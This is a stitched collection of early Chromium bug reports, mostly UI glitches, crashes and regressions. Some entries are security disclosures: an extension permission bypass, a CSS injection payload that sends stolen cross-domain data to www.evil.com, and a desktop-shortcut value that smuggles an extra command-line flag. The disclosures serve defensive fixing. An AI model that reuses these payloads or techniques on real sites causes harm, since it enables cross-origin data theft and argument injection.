Filing the bug to track this issue.

A few folks have discussed not using Sqlite for Safe Browsing, now that the 
current implementation doesn't use database features like indexing.  We use the 
database basically only for storage.  For the ~4.5MB of actual data, the SB2 
histograms show an order of magnitude more bytes read and written.  So switching 
to a flat file sounds like it could reduce the disk access by a lot and make 
Chrome hog the disk less.

back to Firefox."

It seems there must be a leak both browser and extension-side.

title.$t: Referer: header is sent when redirect from https to http

content.$t:
(I have a proof of concept, though it's Google-internal visible only, those 
urls are provided below)

The basic sequence is:
* Start at an https url (https://www/~japhet/)
* Click a link that navigates to an https url (redirect.php)
* The link triggers a redirect to an http url (http://www.google.com)

When http://www.google.com is reached, document.referrer will not show 
a referrer due to http://crbug.com/7357, but the http Referer: header will 
have been sent to google.com, even though the referrer is a secure scheme 
and the destination isn't.

I've got a fix for this just about ready, so assigning to myself.  I'm marking 
this P1 because it seems relatively minor to me, but correct me if I'm 
wrong.

title.$t: all_frames property is not merged to 249

view=rev&revision=33035.  It was never merged to the branch. This could help 
with OOM issues. It could also break the universe.

title.$t: chrome.tabs.executeScriptInTab allows running script in the gallery

content.$t: Perhaps we need to consolidate the tests so we can't make this mistake again?

title.$t: Possible to execute script on unpermitted domains using chrome.tabs.executeScript()

content.$t:
(reported from Ken Kania)

There seems to be a problem where after calling tabs.update with a new url, 
somewhere Chrome thinks that the new url is loaded before it actually is.  
This is evident in that chrome.tabs.get reports the tab url with status 
'complete' before the event listener tabs.onUpdated is fired with a 
'loading' status (by about 100ms).

I think because of this, an extension is able to execute an arbitrary 
script in any web page for a limited time window (~100ms).  The trick is to 
open any desired url and then update to a url that the extension has 
permissions for.  If you call chrome.tabs.executeScript in the 100ms time 
interval, Chrome will inject the script into the previous url that the 
extension does not have permissions for.

I have attached an extension which requests permissions to www.google.com 
and tabs.  If you click on the browser action, the extension loads 
file:///C:/, updates the tab to www.google.com, and injects a script into 
the tab via executeScript.  The injected script sends the first link on the 
page back to the background page via sendRequest.  The background page logs 
the result to its console.  Open the bg console and you should see the name 
of your first file on C:\.

title.$t: For locales that don't include the extensions promo, just show the sync promo

content.$t:
From Miranda:

"Digging through the available translated messages, we could just
use the message "Synchronize my bookmarks..." instead of the combined
promo in non-EN locales. "

title.$t: Disable the XSS auditor on 4.1

content.$t:
Issue 35723 describes how POST operations get a lot slower when the XSS auditor is active.

abarth improved the situation for the specific test in that bug from "a lot slower" to "'only' 400% 
slower than chrome 3".

Now, the test in that bug is not representative from normal-day usage. Then again we don't have 
any tests that do POST requests, so we don't really know how bad 400% worse performance is in 
practice.

What should happen on 4.1?

* Merge abarth's patch and swallow the 400% ("Hey, it's much better than chrome 4")
* Disable the xss auditor on 4.1 (as fast as chrome 3, but less xss auditing takes place).

Discuss.

title.$t: Closed, because you can't stop talking about removing http.

content.$t:
This is my attempt to summarize today's meeting.  Please correct me if I 
have things wrong.

The following changes are in the pipeline already, but have not yet landed:
* Removing "http://" from steady-state display
* Final tweaks to toolbar colors (to make things grey)/shapes/whatever

The following changes will now also happen per mutual agreement:
* https scheme coloring: mixed-content goes from blue -> grey, normal https 
goes from blue -> green
* SSL icon modifications: mixed-content goes from blue-with-triangle -> 
grey "ghost lock", normal https goes from blue -> green (not clear to me 
whether the normal and EV locks are the same)
* SSL label moves: the EV and "broken https" labels move from the right 
side of the URL to the left, between the lock and the URL (need a UI 
treatment of exactly how to separate this section from the URL, or if we 
just use padding)

The following further changes are possible if after landing all of the 
above, we still deem the UI deficient:
* Change EV and normal https from green-icon-and-text-on-white to a green 
background (like Fx 3.x); change broken https from red-on-white to a red 
background
* Modify coloring/treatment of the hostname

*******

I can begin implementing this stuff for Windows immediately; completing 
that will require the new SSL icons and perhaps some graphics or UI design 
on the treatment of the label area.

title.$t: Further SSL UI changes, M5 (Apr 08 mtg)

content.$t:
This replaces bug 40865, because too many people started polluting it with 
noise.

The attached image is a roughly-accurate mock of what I'm implementing.

title.$t: REGRESSION: Copy URL from Omnibox and pasting into rich text does not include protocol string

content.$t: What steps will reproduce the problem? 1. Goto to any website like www.example.com 2. Select the entire URL from the Omnibox and then Copy (eg. Ctrl+C, right-click context menu, etc.) 3. Goto another application and Paste What is the expected output? What do you see instead? If you paste rich text, you'll essentially be pasting the following: <a href="http://www.example.com">www.example.com</a> The text will be as it appeared in the Omnibox but the href will include the http. If you paste plain text you'll get: http://www.example.com When pasting rich text, the text also needs to include the http part. This happens at least for Windows Dev 5.0.375.3 Is this similar/same as Issue 41173 which is for Linux only?

title.$t: REGRESSION: "http://" not copied to clipboard on select all + copy if URL is "http://ftp...."

content.$t: Chrome Version : Google Chrome 5.0.375.3 (Offizieller Build 44229) dev WebKit 533.4 V8 2.2.1.1 User Agent Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.3 Safari/533.4 Command Line /usr/bin/google-chrome --enable-extension-timeline-api --internal-nacl -- enable-gpu-plugin --enable-webgl --enable-internal-flash URLs (if applicable) : http://ftp.mozilla.org/pub/mozilla.org/ What steps will reproduce the problem? 1. Go to http://ftp.mozilla.org/pub/mozilla.org/ 2. Focus Omnibox (eg. hit ctrl+l) 3. Copy URL to clipboard (eg. ctrl+a → ctrl+c) 4. Paste URL somewhere (eg. in OpenOffice.org, or even a text box in Chrome) What is the expected result? For ftp.mozilla.org/pub/mozilla.org/, it should copy-paste http://ftp.mozilla.org/pub/mozilla.org/, because the url was copied from a Webserver (even if it starts with "ftp." in the name) What happens instead? ftp.mozilla.org/pub/mozilla.org/ is copied. No mention of the protocol http://

Go to any page with a YouTube embed (such as the above link) 2. Click on the YouTube icon, or right click and choose "Watch on YouTube" 3. Nothing happens What is the expected result? You should get a new tab with the YouTube watch page for that video. What happens instead? Nothing. Please provide any additional information below. Attach a screenshot if possible.

title.$t: WebM/VP8 video plays too fast on certain content

content.$t:
YouTube WebM content seems to be created correctly and plays back properly.

Other content such as our sync test content was created using different tools, resulting in video that plays back too fast.

Works properly in Firefox and Opera.  We should be able to play back all WebM content regardless of tools used to create the content.

title.$t: Crash on SSL client auth

content.$t: What steps will reproduce the problem? 1. Visit a page that requests a client cert, such as https://foafssl.org/srv/idp?authreqissuer=http://foaf.me/index.php or https://web.mit.edu/consult/www/certificate/test.html What is the expected output? What do you see instead? Either a dialog to select certificates should be displayed or we should send no certificate to the website. We get a crash. Stacktrace below. I've confirmed this on Windows and Linux/ I came across this crash earlier and pinpointed it down to r54405, but it had since been reverted. The commit seems to have been reintroduced as r54714. ( http://crbug.com/49493 ) Bisecting on the Windows nightlies confirms that the crash was reintroduced between r54713 and r54717. Marking as Mstone-6 as issue #49493 suggests the commit has been merged into M6. Interestingly, the DCHECK here is in a similar place to that of http://crbug.com/49862. The revision in question was not checked in at that point though, but it may perhaps be related? title.$t: Investigate rte_fuzz crashes

content.$t:
I hacked together a rich text editing fuzzer last week. The fuzzer creates a crazy DOM, then applies lots of execCommands to random selections in it. It triggers several renderer crashers in Chrome, most of which look exploitable. (Annoyingly, it also causes a lot of renderer hangs...).

I'm attaching the fuzzer to this bug...Googlers can also run it from http://goto/rte_fuzz

title.$t: tab closes when stopping and reloading a website

content.$t: Chrome Version : 6.0.472.25 URLs (if applicable) : Other browsers tested: Add OK or FAIL after other browsers where you have tested this issue: Safari 4: Firefox 3.x: IE 7: IE 8: What steps will reproduce the problem? 1. browse to http://exampleone.com 2. browse to http://exampletwo.com/test.html 2. WHILE LOADING, stop the loading of the webpage 3. press reload button 4. http://exampleone.com tries to load 4. tab crashes What is the expected result? http://exampleone.com should load What happens instead? the tab crashes

title.$t: Always/Never translate a language button(s) should be removed from Incognito

content.$t: What steps will reproduce the problem? 1. Open incognito window and navigate to yahoo.co.jp 2. Translate the page and reload 3. Repeat step 2 three times so you see a 'Always translate Japanese' button 4. Click on the Always translate Japanese button 5. Open normal window and navigate to yahoo.co.jp What is the expected output? Page shouldn't get auto translated What do you see instead? Page gets auto translated. The things that we set in incognito shouldn't propagate to normal window. Looks like we have to remove always/never translate a language buttons from incognito, as they don't have any affect in incognito as well. Google Chrome 6.0.472.36 (Official Build 55963)

title.$t: Linux: using a proxy with plugins cause pages to hang

content.$t: Chrome Version : Google Chrome 4.0.203.2 (Official Build 24690) WebKit 532.0 V8 1.3.8 User Agent Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.203.2 Safari/532.0 OS + version : Ubuntu 8.10 CPU architecture (32-bit / 64-bit): amd64 window manager : Gnome URLs (if applicable) : Behavior in Firefox 3.x (if applicable): Behavior in Chrome for Windows (optional): What steps will reproduce the problem? 1.set --enable-plugins --proxy-server=localhost:8118 2.visit digg.com or engadget.com 3. What is the expected result? Page should load What happens instead? Hangs while loading Please provide any additional information below. Attach a screenshot and backtrace if possible. I have 64 bit flash plugin in the plugins folder. The pages load Alright if the plugin is not enabled. Seems like flash is causing hangs in these pages. In general system is quite unstable with enable-plugins and proxy- server settings enabled together, but seems alright when only enable- plugins is set.

title.$t: HTML5 Workers run outside of the sandbox

content.$t: VULNERABILITY DETAILS An HTML5 Dedicated worker clearly runs outside of the sandbox on at least the Linux platform. This is a problem because we normally run the Javascript engine inside the sandbox. Therefore, an attacker could abuse a worker to escape the sandbox if they had a bug in the Javascript engine (compiler or runtime, if I understand correctly). VERSION Chrome Version: 6.0.472.53 Operating System: Ubuntu 9.04, 32-bit REPRODUCTION CASE 1) Visit http://html5demos.com/worker and hit the "Start worker" button. 2) Run the "top" utility to identify the worker process. It will be called simply "exe" and running at nearly 100% CPU. 3) Note the PID of this process. 4) ls -l /proc/PID 5) Observe the CWD and ROOT of this process: ... lrwxrwxrwx 1 chris chris 0 2010-09-08 01:23 cwd -> /home/chris ... lrwxrwxrwx 1 chris chris 0 2010-09-08 01:23 root -> / I'm not sure if this is some "unimplemented" thing on Linux or if it's a generic cross-platform issue. I don't have a Windows or Mac OS machine around to check, and I'm not an expert on the process exploration tools on those machines either :) cc: cpu@, nsylvain@ who might know offhand if the Windows build has workers running inside the sandbox.

title.$t: Chrome sets a wildcard identity preference which could cause Safari to send certificate to untrusted sites.

content.$t: Chrome Version : 5.0.379.0 (44664) URLs (if applicable) : N/A OS version : 10.6.3 (10D573) Behavior in Safari 3.x/4.x (if applicable): OK Behavior in Firefox 3.x (if applicable): N/A Behavior in Chrome for Windows: N/A What steps will reproduce the problem? 1. Install a personal certificate 2. Create a wildcard, say https://web.mit.edu 3. Goto a website the requires a personal certificate and matches the wildcard, say https://web.mit.edu What is the expected result? Chrome should not set any identity preferences. What happens instead? Chrome creates wildcard identity preferences, in this example for both *.mit.edu and *.edu. The problem with this is Safari will then use those identity preferences, possibly sending the user's certificate to an untrusted site. Worse, by having a wildcard identity preference for a top level domain, Safari will send the identity preference to many external domains, without user interaction. This could possible expose personal information such as name and e-mail.

title.$t: SSL Client Auth fails on some webservers

content.$t: Chrome Version : 5.0.375.55 URLs (if applicable) : various - protected by SSL client cert auth OS version : 10.6.3 & 10.5.8 Behavior in Safari 3.x/4.x (if applicable): Works Behavior in Firefox 3.x (if applicable): Might work (Firefox has troubles accessing some Keychains) Behavior in Chrome for Windows: Works (uses different code path) What steps will reproduce the problem? Use a smartcard or client certificate to navigate to a webserver that does not require a client cert upon initial connection, but initiates a renegotiation to require a client cert. What is the expected result? Chrome should prompt the user for the cert to use, send the cert to the webserver, and succeed. What happens instead? Error 107 (net::ERR_SSL_PROTOCOL_ERROR): SSL protocol error. If the server requests/requires a client cert upon initial connection, Chrome works as expected. This is *only* for webservers that request the client cert after the initial handshake. This is used frequently with Apache to allow some parts of the web server to be "public" unprotected resources. Bug 40561 has information related to this issue.

Focus the cursor on a text input in a form 2. Press the down arrow key to trigger autocomplete What is the expected result? Autocomplete dropdown appears normally What happens instead? The dropdown appears, but the display is corrupted graphically and selecting a result inserts unpredictable things into the input or, sometimes, crash the browser. Attached is a screenshot of the issue, and an OS X crash report I received seconds later when I clicked one of the results from the screenshot. (One thing to note, this is a development site, so the oddly spelled domains and text in the screenshot are things I've actually entered, not a product of the bug) In this case, the inputs I can reproduce this on are named with square brackets: <input type="text" size="30" value="" name="contact[first_name]" /> <input type="text" size="30" value="" name="contact[last_name]" /> etc.

title.$t: Mac default audio/video controls are using wrong sliders

content.$t:
The progress slider thumb and the volume slider controls look very, very strange in both Chromium nightlies and official builds of Chrome.

Our layout tests DID catch this but the WebKit garnderer rebaselined the results (possibly without checking with us?) and as a result this went completely unnoticed.

WebKit rebaseline change:
http://trac.webkit.org/changeset/58952

My guess at the offending change:
http://trac.webkit.org/changeset/58943

...if not look for changes starting from 58952 and go backwards.  Anything mentioning Mac, theme, style, etc...

It's OK to release a beta (mention it as known issue?) but should really, really be fixed for stable.

title.$t: The sorry state of Chrome in German

content.$t: What steps will reproduce the problem? 1. Set your language to German 2. Start Chrome 3. Open Preferences What is the expected output? What do you see instead? Alright, where should I begin? The Under the Hood preference window looks like the attached image. The content exception dialog has "Löschen" (delete) for the remove button, but "Alle entfernen" for remove all. That bug has only been open for like three months (issue 42542). Selecting "Personal Stuff" or "Basics" results in a DCHECK "Initial width set wasn't wide enough.", so I couldn't even see what ugliness lurks there.

title.$t: chrome on mac shows blank pixels on table layout

content.$t: Chrome Version : 7.0.503.0 (Official Build 57033) dev URLs (if applicable) : Other browsers tested: None What steps will reproduce the problem? 1. Open attached .html file in Chrome 2. Reload and scroll up/down until the pixel errors are visible What is the expected result? No blank pixels in the table borders. What happens instead? Clearly visible blank pixels in the table borders, which can sometimes appear/disappear when scrolling up or down. Please provide any additional information below. Attach a screenshot if possible.

title.$t: Download no longer available once window closes if in incognito mode, yet it continues.

content.$t:
- open an incognito window
- start a long download, such as an XCode SDK
- open downloads tab, verify it shows up (should also have a incognito badge icon, but doesn't)
- close all open windows
- open a new incognito window and open downloads tab

expected:
- should see download that's in progress

actual:
- download can no longer be accessed in any window, though network activity shows it is still going
- dock icon badge stops updating as soon as you close the window, and doesn't go away even when download finishes.

This is on Mac, I haven't tested other platforms. r58816.

title.$t: Double-clicking in Task Manager brings up wrong tab

content.$t: Chrome Version : 7.0.503.0 dev (Mac OS) What steps will reproduce the problem? 1. open a bunch of tabs 2. double-click a tab from within the Task Manager What is the expected result? Chrome should switch to the clicked-on tab. What happens instead? It brings up some random tab. I have not been able to determine if there is a pattern to what is actually shown, relative to what was clicked upon. Please provide any additional information below. Attach a screenshot if possible. This is a regression from earlier version of Chrome. It seems to have started around the switch to the 7.0 dev series. In the past, double-clicking on a tab brought that to the forefront, as expected.

title.$t: App icon looks like stuck throbber on Vista

content.$t:
on vista, 4.0.237.0

I don't know how to reproduce, but currently my system icon for chrome is 
stuck on the throbber. By system icon, I mean the icon that shows up when you 
hit alt-tab, the icon in the task bar at the bottom, and the icon on the top 
left of child windows (e.g. the about window).

It's not moving, it's just stuck there. I was just surfing the web normally 
when it happened.

title.$t: Browser crash when trying to navigate to any url using command prompt when toast is seen @ DictionaryValue::HasKey

content.$t: What steps will reproduce the problem? 1. Install Chrome (and make it your default browser) 2. Don't use that machine for a month 3. Use the machine, and get the "inactive toast" offer to "uninstall" or to "try it". Note this is an almost instance of Chrome running! 4. Click on the link "Why am I seeing this?" 5. A second (real?) instance of Chrome will start, explaining why the offer is made. 6. Click on the "toast" to "try it" (rather than "uninstall"). 7. The Toast turns into a "real" instance of Chrome, with a dialog telling you that Chrome has crashed (not shutdown cleanly). :-). What is the expected output? IMO, when Chrome *is* the default browser, the "Inactive Toast" should NOT appear. Failure one of the users to use a particular computer should not instigate the toast. If it does appear, it should never instigate the conflicting use of the default profile. (I was assured by Carlos that this won't corrupt our profile, but it is a scary side effect to worry about!).

title.$t: ctrl-c and ctrl-insert trigger different copying behavior

content.$t:
Put an http:// URL in the address bar.  Open wordpad.

(1) Copy the whole URL with ctrl-c and paste into wordpad.
(2) Copy the whole URL with ctrl-insert and paste into wordpad.

Step (1) pastes plain text, and step (2) pastes rich text.  Because of bug 
41489, this also means that (1) has a scheme and (2) does not.

title.$t: Pixel glitches on lower right corner of toolbar

content.$t:
Somehow we've introduced pixel glitches on the main toolbar's lower right corner when in restored mode..

* On my dev build, with glass theme, the "shadow" line cuts off a couple pixels short.
* On my dev build, with a custom theme, it looks like the "shadow" cuts off even shorter.
* On my trunk build, with the opaque theme, the toolbar edge is 1 px left of the scrollbar edge below.  This looks super broken.

title.$t: Sync: Misalignment of the 'Choose what to sync:' string in the sync setup UI

content.$t:
ENVIRONMENT
Google Chrome	6.0.472.49 (Build officiel 57477)
WebKit	534.3
V8	2.2.24.16
Agent utilisateur	Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.49 Safari/534.3
Ligne de commande	...\datadirs\6.0.472.49_beta_C1 --enable-log --log-level=0 --lang=fr

REPRO STEPS
1. Open Wrench -> Options -> [Set up sync...] and enter valid credentials;
2. The Set up sync dialog appears.

ACTUAL RESULTS
The 'Choose what to sync:' string is on a new line andas such not aligned with the respective checkbox.

EXPECTED RESULTS
Expected that the two will be aligned, see 'Keep everything synced'.

ADDITIONAL INFO
Repros in every language.

title.$t: When Chrome is set as default while installing, importing data from previous default browser is broken

content.$t: What steps will reproduce the problem? 1. Have Firefox as default browser 2. Go to http://www.google.com/chrome/eula.html?extra=betachannel 3. Select the option to make chrome as default 4. Install What is the expected output? When install completes, History and Homepage settings should be imported through Firefox What do you see instead? Since we are making Chrome as default, when the time comes to import data, it sees that Chrome is default and imports data from IE Google Chrome 6.0.472.x

title.$t: Permission increase UI not displayed if user dismisses infobar

content.$t:
We have a report that if the user dismisses the infobar UI, the permissions 
dialog is not displayed when they later re-enable the extensions from the 
management page.

title.$t: Remove extensions promo from i18n locales

content.$t:
For the initial stable release, we're not showing the promo for i18n locales.

Rationale: "We'd still have the i18n'd galleries, which gives developers an incentive to translate their 
content, but most users wouldn't be exposed to them. We could add the promo and do a mini 
launch in each country as soon as it had enough content."

title.$t: We seem to be allowing extensions to run that use experimental APIs

content.$t:
See 
https://chrome.google.com/extensions/detail/cahejgbbfgmlmjgdjlibphdjeldhagkp

title.$t: "About Google Chrome" crashes Chrome @ installer::Version::IsHigherThan

content.$t: Chrome Version : 4.0.288.1 Official Build 35555) 2.0-dev-cf-full-cf- full-cf-full-cf What steps will reproduce the problem? 1. Click on wrench, select "About Google Chrome" What is the expected result? Chrome doesn't crash What happens instead? Chrome crashes, pop-up comes up saying "Whoa! Google Chrome has crashed. Restart now?" Please provide any additional information below. Attach a screenshot if possible. The first time this happened, About Google Chrome got farther, popped up its window, said "checking for new versions of Chrome..." I got tired of waiting and clicked the X in the upper right corner, and Chrome crashed. All subsequent times it crashes immediately.

title.$t: Can't remove Local Storage if there's no cookie in "Cookies and Other Data" dialog

content.$t: Chrome Version : 5.0.317.2 (Official Build 38193) Other browsers tested: Chromium Build 38304: FAIL What steps will reproduce the problem? 1.Install an extension which use local storage. (e.g. Google Mail Checker) 2.Browse some websites to receive cookies. 3.Open [Options] > [Under the hood] > [Content settings] > [Show cookies and other site data]. 4.Remove each website cookies only, leave Local Storage. 5.Close and reopen "Cookies and Other Data" dialog. What is the expected result? [Remove] and [Remove All] buttons should be enabled. What happens instead? [Remove] and [Remove All] buttons are disabled. So that Local Storage can't be removed. Please provide any additional information below. Attach a screenshot if possible. In the above step 4, Local Storage can be removed by clicking [Remove] after selecting each files, or by clicking [Remove All].

title.$t: Crash when opening inspector on JS-disabled page while "Send from Gmail" is installed

content.$t: What steps will reproduce the problem? 1. Set "Content Settings" -> "Javascript" -> "Do not allow any site to run Javascript" 2. Access a web page and then launch Inspector/development tool What is the expected output? What do you see instead? Though Javascript is blocked, but since Inspector is a Chrome built-in tool, then it should work properly, this means it should show the source code of page, but currently it shows blank. Issue happens in Beta candidate 4.1.249.1011 (Official Build 39069). It is even worse in latest trunk 5.0.331.0 (Developer Build 39220), it crashes the inspected page when in latest trunk. Please use labels and text to provide additional information.

title.$t: Expanded state of Browser Action container will be lost after restart

content.$t: Chrome Version : Chromium 6.0.486.0 (Developer Build 54919) What steps will reproduce the problem? 1.Install some Browser Action extensions. 2.Resize the Brower Action container. Drag the right end of the Omnibox to the right in order to hide some extension icons, then release the mouse button. At this point, overflow chevron will be shown. 3.Expand the Brower Action container completely to show all the extension icons. At this point, overflow chevron will disappear. 4.Restart Chromium, and observe the Brower Action container. What is the expected result? All the extension icons should be displayed. The overflow chevron shouldn't be displayed. What happens instead? Some of the extension icons will be hidden. And the overflow chevron will be displayed. (In other words, it goes back to the state at above step 2) Please provide any additional information below. Attach a screenshot if possible. Confirmed on Windows XP/7. This issue seems to be a regression in r54174. Chromium Build 54166: OK Chromium Build 54181: FAIL If one of the Browser Action extensions is disabled and then enabled after above step 3, the fully-expanded-state of Browser Action container will be restored properly after restart.

title.$t: Content type "application/xhtml+xml" no longer works with http header.

content.$t:
Seems like a corrupted installation as per user report.
From the user:
"This morning I started getting error reports that my users were unable
to use my application and the problem has been traced to GCF. I've
been able to replicate the problem on my own machine as well as
another remote machine and it has these following characteristics:

- chromeframe/6.0.472.33 shows up now in the user agent string of IE6/
IE8 (only two browsers versions I tested on)
- Google Chrome Frame doesn't show up in the Add/Remove Programs in
Control Panel
- ChromeFrameBHO is still listed in IE in the manage add-ons
- ChromeFrame is not invoked in IE6/IE8 using the HTTP Header method
(probably because it has become corrupted)
- If I try to install over what I currently consider a "corrupt update/
installation"
-- using the web installer, I'm told it was installed successfully,
but the above points don't change
-- using the msi installer, I'm given an Error 1722 "There is a
problem with this Windows Installer package. A program run as part of
the setup did not finish as expected. Contact your support personnel
or package vendor.""


http://groups.google.com/group/google-chrome-frame/browse_thread/thread/24f42a56cad5b1ab?hl=en

If we use a existent non-google.com account e.g. a gmail account, then sync will not show captcha after a number of failed login attempts. On the other hand, when i go to gmail.com and attempt to login, it does show the captcha.

This will allow to

1) enumerate valid email addresses.
2) brute force a password for a particular account.

verified in 6.0.493.0 (56045) on windows vista.

title.$t: Security: cross domain thefts via CSS string property injection

content.$t:
This bug is kind of annoying. The hope is that something can be done at the
browser level. We really don't want to have to make sweeping changes to
lots of our applications, and generally burden web apps with more web
browser issues.

This affects Chrome, Safari, IE, Opera and FF. But let's keep this bug
Chrome-private whilst we debate what can be done (and protect our customers
first :)

The attack involves cross-domain CSS stylesheet loading. Because the CSS
parser is very lax, it will skip over any amount of preceding and following
junk, in its quest to find a valid selector. Here is an example of a valid
selector:

body { background-image: url('http://www.evil.com/blah'); }

And here is an example of a valid selector embedded in an XML document
(this is a paraphrase of a real example low-severity attack):

<photo_comment from="evil"> blah { blah:0 } body { background-image:
url('http://www.evil.com/</photo_comment><photo_comment from="trusted"
url="url_with_key_to_hidden_photo">some secret
comment</photo_comment><photo_comment from="evil"> ');}</photo_comment>

As you can see, if the attacker can inject a couple of strings into a
trusted response, there is a useful attack here. The data is stolen cross
domain with e.g. window.getComputedStyle(body_element,
null).getPropertyValue('background-image');
(Note that the seemingly redundant blah { blah:0 } selector is to resync
the CSS parser to make sure the evil descriptor parses properly).

There are a surprising number of places in our products where an attacker
can do this. It can apply to HTML, XML, JSON, XHTML, etc.

The main common construct that prevents exploitation is newlines.
Obviously, newlines cannot be considered a defense! The exploitable places
in Google include some JSON and XML data APIs that return responses on a
single line. Some of our XHTML / HTML just happens to be emitted this way too.
Regarding JSON and XML, note that it is not currently a security
requirement to escape ' and " (XML values) or ' (JSON values within double
quoted strings). Nor should we make it a requirement.


Regarding how to fix the browser, here are some starting ideas (from an
ise-team brainstorm).

1) When loading cross-domain CSS, engage a stricter parsing mode that stops
on first syntactic (but not sematic of course) errors.

2) Same as 1), but also only engage when the MIME type is not CSS.

3) Some variant of 1) or 2) but only engage when X-Content-Type-Options:
nosniff is seen (won't help most of the internet).

4) When loading cross-domain CSS, do not send cookies (probably breaks the
internet :-/ )

Please, feel free to cc: additional people who may be able to help. But try
and keep within Google for now.

title.$t: need a way to run before/after page_cycler tests with extensions / user scripts

content.$t:
Extensions can affect page load performance.  Poorly written extensions can 
severely affect page load performance.  We need a way to measure page cycler 
performance with and without extensions.  We need this packaged up in two 
ways:

(1) a way that allows extension developers to test the performance of their 
extension
(2) a way that allows us to do automated testing of extensions on bots

title.$t: Bound the total number of sockets in a pool

content.$t:
I had an outstanding patch for this a while ago, but it has since bit-rotted 
:(

The general idea is, that as a safe-guard against denial of service attacks 
(and to bound memory consumption etc.) should have a bound on the total 
number of open sockets allowed in the system.

title.$t: REGRESSION: reload link on error pages doesn't do anything

content.$t:
REGRESSION: reload link on error pages doesn't do anything

Observed in 3.0.195.0 (Developer Build 21086).  Works in 2.0.172.39.

title.$t: Omnibox result flicker

content.$t:
Type "spa" into the omnibox and wait for it to settle.  Then type "m".  For 
both Linus and me, this results in a nasty dual-update flicker.

The first update seems to have all the local results, with the second 
bringing in Suggest + NavSuggest.  But the two come so close together that 
it's not clear why these aren't both below the max delay threshold in the 
controller.  They ought to somehow be coalesced into one.

Linus would like this to block stable (I think).

title.$t: When plugins are disabled, sony.com does not realize Flash won't work

content.$t: Chrome Version : 3.0.195.6 URLs (if applicable) : http://sony.com Other browsers tested: Firefox 3.x: OK What steps will reproduce the problem? 1. Visit http://sony.com What is the expected result? Sony's web-site should display. What happens instead? Blank page is displayed. Please provide any additional information below. Attach a screenshot if possible.

title.$t: Chromium shouldn't allow XHR to local directories

content.$t:
Not entirely sure this is a bug, but is a difference from other browsers, and causes a LayoutTest to fail.  Looking for input so I 
can resolve the LayoutTest properly.

Navigating to a file url for a directory (like file:///C:/foo), gives the following results:
IE: Opens a native windows file browsing window for that directory
FF: Nicely formatted directory listing page
Safari: Page with a "You don't have permission to open this page" message.
Chrome: Nicely formatted directory listing page 

Doing an xhr to the same url (xhr.open("GET", "foo", true)) from a local file url gives the following results:
IE: Throws exception: Exception: Access is denied.
FF: Throws exception: Exception: Access to restricted URI denied
Safari: Fires onError, responseText ""
Chrome: Success, with responseText the same as the lovely page served when accessed directly.

So, I guess I'm asking, is the Chrome behavior by design?  If so, I'll just rebaseline.  If not, I can file more appropriate bug.

title.$t: Security: sanitize URLs better before creating desktop shortcuts

content.$t:
On Windows, we currently create desktop shortcuts the following way:

"X:\Path\To\chrome.exe" --app=<URL>

We filter <URL> for 0x20, 0x09, 0x0a, 0x0b, 0x0d, etc, but we otherwise let
most other data indiscriminately. One of the characters that is not
filtered is % (e.g., stray % will not be encoded as %25 or removed). This
permits a shortcut such as:

"X:\Path\To\chrome.exe"
--app=http://example.com/%some_env_variable%--renderer-path=/something/else/entirely

...to be created if the user is duped into clicking "Create application
shortcut" on a malicious page.

This syntax will be substituted by Windows prior to launching chrome.exe.
If %some_env_variable% happens to end with a whitespace, things go bad.

To fix: ideally, I would recommend a different syntax, such as:

"X:\Path\To\chrome.exe" --launch-in-app-mode -- http://example.com/...

This is much more robust (we could still support the --app syntax for
legacy shortcuts). 

If we feel it is too late to change the syntax, however, we should at the
very minimum, be more pedantic about escaping here. 

I would also recommend escaping characters such as ", \, etc, as their
effect on Windows shell parsing is unclear to me, I don't think it's
well-documented anywhere, and if they actually legitimately appear in an
URL, the URL will be corrupted.

I did some quick tests on Linux, but don't see an obvious way to break it
there (we escape `, $, ", etc).

It crashes at the following assertion failure: ASSERT(isMainThread()) in buildBaseTextCodecMaps() in Webcore\platform\text\TextEncodingRegistry.cpp What is the expected output? What do you see instead? Please use labels and text to provide additional information. click to open the 2nd "more" link works fine.

title.$t: Bookmark chevron should throb until user clicks it after merge

content.$t:
If I merge a second computer's bookmarks, the bookmarks on that computer's 
bookmark bar are added to my existing bookmarks, but if I have a lot of 
bookmarks on my current bookmarks bar they are added to the chevron overflow 
menu. This makes it a little hard to tell that the merge worked - it wasn't 
clear to me where the bookmarks went.

It'd be nice to pulsate the chevron after the merged items are added there. 
The chevron already pulsates for a short time after a bookmark is added to 
the bookmark bar and goes into the menu. I would say that in this case after 
the merge the chevron menu should pulsate until the user clicks on it.
